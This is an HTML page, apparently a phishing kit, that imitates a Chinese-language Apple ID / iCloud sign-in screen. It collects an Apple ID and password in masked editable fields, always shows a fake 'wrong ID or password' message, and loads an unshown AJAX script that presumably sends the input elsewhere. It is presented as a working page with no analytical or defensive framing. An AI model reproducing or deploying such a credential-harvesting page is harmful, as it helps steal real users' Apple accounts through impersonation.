<html>

<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<link rel="icon" href="picture/favicon.ico" type="image/x-icon">
	<link rel="shortcut icon" href="picture/favicon.ico" type="image/x-icon">
	<meta name="viewport" content=" initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
	<meta name="format-detection" content="telephone=no">
	<script src="http://cdn.static.runoob.com/libs/angular.js/1.4.6/angular.min.js"></script>
	<script src="jquery-3.2.1.min.js"></script>
	<link rel="stylesheet" href="picture/wapcss_idcn.css" media="all">
	<script> $(document).keydown(function (e) { if (e.keyCode == 8) { localtion.reload(true); } })</script>
	<script>
		$(function () {
			$("body").keydown(function (event) {
				if (event.keyCode == 8) {
					location.reload();
				}
			});
		});

	</script>
	<script type="text/javascript">
		function changeImg(Apwd) {
			document.getElementById(Apwd).src = "image/2.gif";
			setTimeout("document.getElementById('" + Apwd + "').src='login.png';", 1000);
		}
	</script>
	<script type="text/javascript">

		function AchangeTest(obj) {

			if (obj.innerHTML.length == 0) {

				document.getElementById('Apwd').className = 'input';
				document.getElementById('Apwd').disabled = true;
				document.getElementById('testDiv1').className = 'button1';
				document.getElementById('testDiv1').disabled = true;

			} else {
				document.getElementById('Apwd').className = 'classa';
				document.getElementById('Apwd').disabled = false;
				document.getElementById('testDiv1').className = 'button2';
				document.getElementById('testDiv1').disabled = false;
			}

		}

	</script>
	<script>
		if (window.name != "bencalie") {
			location.reload();
			window.name = "bencalie";
		}
		else {
			window.name = "";
		}
	</script>
	<script type="text/javascript" language="javascript">
		function OnTextChanged() {
			if (event.keyCode == 13) {//判断是否为回车键
				event.keyCode = 0;//屏蔽回车键
				event.returnValue = false;

			}
		}
	</script>
	<script type="text/javascript">

		function changeTest(obj) {

			if (obj.innerHTML.length == 0) {

				document.getElementById('test').disabled = true;
				document.getElementById('qieh').disabled = true;

			} else {
				document.getElementById('test').disabled = false;
				document.getElementById('qieh').disabled = false;

			}

		}
	</script>
	<script src="JQ_AJAX.JS"></script>
	<script type="text/javascript">
		function checktxt() {
			var a = document.getElementById("loginn").innerHTML;
			if (a == null || a == "") {
				document.getElementById("loginn").style.display = "block";
			} else {
				document.getElementById("loginn").style.display = "none";
			}


		}
	</script>
	<style type="text/css">
		/**css样式*/
		.input {
			width: 300px;


			-webkit-text-security: none;
			font-size: 15px;
			padding: 4px 5px;


			line-height: 18px;
			white-space: nowrap;
			color: #CCCCCC
		}

		#App1:empty::before {
			content: attr(placeholder);
		}

		.input:empty::before {
			content: attr(placeholder);
		}

		.classa {
			width: 300px;


			-webkit-text-security: disc;
			font-size: 15px;
			padding: 4px 5px;


			line-height: 18px;
			white-space: nowrap;
			color: #CCCCCC
		}

		#loginn {
			display: none;
		}

		.login_1 {
			width: 26px;
			height: 26px;
			background-image: url(39.png);
			border: none;
		}

		.login_2 {
			width: 26px;
			height: 26px;
			background-image: url(41.png)border:none;
		}

		.button1 {
			display: block
		}

		.button2 {
			display: none
		}
	</style>
	<script language="javascript">
		window.onload = function () {
			var oBtn = document.getElementById('login-button2');
			var oDiv = document.getElementById('loginn1');
			oBtn.onclick = function (ev) {
				var oEvent = ev || event;
				oDiv.style.display = 'block';
				oEvent.cancelBubble = true;
			}
			document.onclick = function () { oDiv.style.display = 'none'; }
		}
	</script>
	<style>
		.tip {

			width: 250px;

			height: 70px;

			border: 1px solid #fae9a3;

			border-radius: 8px;
			background-color: #fae9a3;

		}



		.tip .inner {

			background-color: #fae9a3;

			width: 10px;

			height: 10px;

			border: 1px solid #fae9a3;



			position: relative;

			left: 0px;

			top: -7px;

			transform: rotate(45deg);

			border-right: 0px;

			border-bottom: 0px;
			background-color: #fae9a3
		}

		#pop {
			z-index: 9999;

		}
	</style>
</head>

<body>
	<div style="margin-top:20%; "></div>
	<center>
		<img src="icloud_drive_icon.png" style="width:200px">
	</center>
	<p></p>
	<div class="main" style="border:0px solid red">
		<p class="lok">管理您的 Apple ID 账户</p>
		<ul class="main_list" id="login-right">
			<li id="bton1" style=""> <span id="testDiv" class="">
					<input name="login-button2" id="test" type="image" src="login.png" disabled="disabled" width="26" height="26"
						align="right" style="margin-top:-4px;outline:none;" onClick="changeclass()">
				</span>
				<div contenteditable="true" class="input " id="App1" name="App1" type="text" placeholder="Apple ID"
					style="outline:none;color: #999; font-weight:100" onKeyDown="ADivFollowingText();"
					onKeyPress="OnTextChanged();" onblur="checktxt();" onKeyUp="changeTest(this);"></div>
			</li>
			<li id="testDiv1" class="button2"><span class="">
					<input name="login-button" id="qieh" type="image" disabled="disabled" src="login.png" width="26" height="26"
						align="right" style="margin-top:-4px;outline: none;" ng-app="myApp" ng-controller="personCtrl"
						ng-click="toggle()" onClick="changeImg(this.id)" class="ng-scope">
				</span>
				<div style="outline:none;color: #999;" id="Apwd" class="input " name="Apwd" contenteditable="TRUE"
					placeholder="密码" onKeyUp="AchangeTest(this);" onKeyDown="DivFollowingText();" onKeyPress="OnTextChanged();">
				</div>
			</li>
		</ul>

		<div align="center" style="position:absolute;z-index:9999;margin-top:1%;display:none;padding-left:25px;" id="pop">
			<div class="tip">
				<div class="inner"></div>
				<div style="margin:4px; font-size:15px;color:#503e30" align="center">Apple ID 或密码不正确</div>
				<div style="margin:4px; font-size:10px;color:#503e30" align="center"><a href="" style="color:#503e30">忘记密码?</a>
				</div>
			</div>
		</div>


		<div align="center"><br>
			<br>
			<label id="remember-me-label" class="form-label" for="remember-me"> <span class="form-choice-indicator"><img
						id="img" src="image/0190128135834.png" width="16" height="17"></span> <span
					style=" font-size:15px;color:#FFFFFF">保持我的登录状态</span> </label>
		</div>
		<br>
		<script type="text/javascript">
			document.getElementById("test").onclick = function () {
				document.getElementById("testDiv").style.display = "none";
				document.getElementById("testDiv1").style.display = "block";
				document.getElementById("bton1").style = "border-bottom:1px solid #dedede;";

			}
		</script>
		<script type="text/JavaScript">

	function stopPropagation(e) {
		var ev = e || window.event;
		if (ev.stopPropagation) {
			ev.stopPropagation();
		}
		else if (window.event) {
			window.event.cancelBubble = true;//兼容IE
		}
	}
	$("#qieh").click(function (e) {
		$("#pop").show();
		stopPropagation(e);
	});
	$(document).bind('click', function () {
		$("#pop").hide();
	});
	$("#pop").click(function (e) {
		stopPropagation(e);
	});
</script>
		<script>
			window.onload = function () {
				var oImg = document.getElementById('img');
				var onOff = true;

				oImg.onclick = function () {
					if (onOff) {
						oImg.src = 'image/20190128142059.png';
						onOff = false;
					} else {
						oImg.src = 'image/0190128135834.png';
						onOff = true;
					}
				};

			};
		</script>


</body>

</html>